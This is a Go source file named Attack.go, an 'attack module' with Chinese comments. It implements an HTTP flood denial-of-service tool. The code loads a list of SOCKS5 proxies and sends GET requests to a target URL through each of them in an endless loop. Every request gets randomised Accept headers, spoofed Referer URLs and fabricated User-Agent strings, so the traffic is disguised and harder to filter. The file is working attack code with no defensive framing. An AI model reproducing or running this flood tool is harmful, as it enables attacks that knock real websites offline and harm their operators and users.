/*
 * @Author: NyanCatda
 * @Date: 2022-09-09 23:30:37
 * @LastEditTime: 2022-09-10 01:58:22
 * @LastEditors: NyanCatda
 * @Description: 攻击模块
 * @FilePath: \Momoi\Attack.go
 */
package main

import (
	"encoding/json"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/nyancatda/AyaLog"
	"github.com/nyancatda/Momoi/Tools/File"
	"github.com/nyancatda/Momoi/Tools/Pool"
	"github.com/nyancatda/Momoi/Tools/Random"
	"golang.org/x/net/proxy"
)

var acceptHeaders = []string{
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept-Encoding: gzip, deflate\r\n",
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
}

var refererHeaders = []string{
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
}

/**
 * @description: 开始攻击
 * @param {string} URL 需要攻击的URL
 * @param {int} PoolNum 线程池内线程数量
 * @return {*}
 */
func AttackStart(URL string, Cookies string, PoolNum int) {
	if PoolNum <= 0 {
		PoolNum = 1
	}

	// 获取代理列表
	ProxysFile, err := File.NewFileReadWrite(ProxysFileName, os.O_RDONLY)
	if err != nil {
		AyaLog.Error("System", err)
		os.Exit(0)
	}
	ProxysFileBody, err := ProxysFile.Read()
	if err != nil {
		AyaLog.Error("System", err)
		os.Exit(0)
	}

	var ProxysList []string
	err = json.Unmarshal([]byte(ProxysFileBody), &ProxysList)
	if err != nil {
		AyaLog.Error("System", err)
		os.Exit(0)
	}

	// 开始攻击
	AyaLog.Info("System", "开始攻击")
	wg := Pool.NewPool(PoolNum)

	Request := func(Proxy string) {
		defer wg.Done()
		Dialer, err := proxy.SOCKS5("tcp", Proxy, nil, proxy.Direct)
		if err != nil {
			return
		}
		httpTransport := &http.Transport{}
		httpTransport.Dial = Dialer.Dial

		// 设置请求参数
		httpClient := &http.Client{
			Transport: httpTransport,
		}

		Reqest, err := http.NewRequest("GET", URL, nil)

		//设置请求头
		Accepts := strings.SplitN(Random.StringArray(acceptHeaders), "\r\n", -1)
		for _, Accept := range Accepts {
			HeaderValue := strings.SplitN(Accept, ": ", 2)
			if len(HeaderValue) != 2 {
				continue
			}
			Reqest.Header.Set(HeaderValue[0], HeaderValue[1])
		}
		Reqest.Header.Set("Connection", "Keep-Alive")
		Reqest.Header.Set("Cookies", Cookies)
		Reqest.Header.Set("User-Agent", CreateUserAgent())
		Reqest.Header.Set("Referer", Random.StringArray(refererHeaders)+url.QueryEscape(URL))
		AyaLog.DeBug("Attack", Reqest.Header)

		Resp, err := httpClient.Do(Reqest)
		if err != nil {
			AyaLog.Error("System", err)
			return
		}
		defer Resp.Body.Close()

		AyaLog.Info("Attack", Proxy, "->", URL, Resp.Status)
	}

	// 循环开始攻击
	for {
		for _, Proxy := range ProxysList {
			wg.Add(1)
			go Request(Proxy)
		}
	}
}

/**
 * @description: 生成随机UserAgent
 * @return {string} UserAgent
 */
func CreateUserAgent() string {
	// 随机操作系统
	Platform := Random.StringArray([]string{"Macintosh", "Windows", "X11"})
	var OS string
	switch Platform {
	case "Macintosh":
		OS = Random.StringArray([]string{"68K", "PPC", "Intel Mac OS X"})
	case "Windows":
		OS = Random.StringArray([]string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"})
	case "X11":
		OS = Random.StringArray([]string{"Linux i686", "Linux x86_64"})
	}

	// 随机浏览器
	Browser := Random.StringArray([]string{"chrome", "firefox", "ie"})
	switch Browser {
	case "chrome":
		WebkitVersion := strconv.Itoa(Random.Intn(599, 500))
		Version := strconv.Itoa(Random.Intn(99, 0)) + ".0" + strconv.Itoa(Random.Intn(9999, 0)) + "." + strconv.Itoa(Random.Intn(999, 0))
		return "Mozilla/5.0 (" + OS + ") AppleWebKit/" + WebkitVersion + ".0 (KHTML, like Gecko) Chrome/" + Version + " Safari/" + WebkitVersion
	case "firefox":
		NowYear := time.Now().Year()
		Year := strconv.Itoa(Random.Intn(NowYear, 2020))

		RandomMonth := Random.Intn(12, 1)
		var Month string
		if RandomMonth < 10 {
			Month = "0" + strconv.Itoa(RandomMonth)
		} else {
			Month = strconv.Itoa(RandomMonth)
		}

		RandomDay := Random.Intn(28, 1)
		var Day string
		if RandomDay < 10 {
			Day = "0" + strconv.Itoa(RandomDay)
		} else {
			Day = strconv.Itoa(RandomDay)
		}

		GeckoVersion := Year + Month + Day
		Version := strconv.Itoa(Random.Intn(72, 1)) + ".0"
		return "Mozilla/5.0 (" + OS + "; rv:" + Version + ") Gecko/" + GeckoVersion + " Firefox/" + Version
	case "ie":
		Version := strconv.Itoa(Random.Intn(99, 1)) + ".0"
		EngineVersion := strconv.Itoa(Random.Intn(99, 1)) + ".0"
		Option := Random.BoolArray([]bool{true, false})
		var Token string
		if Option {
			Token = Random.StringArray([]string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}) + "; "
		}

		return "Mozilla/5.0 (compatible; MSIE " + Version + "; " + OS + "; " + Token + "Trident/" + EngineVersion + ")"
	}

	return ""
}
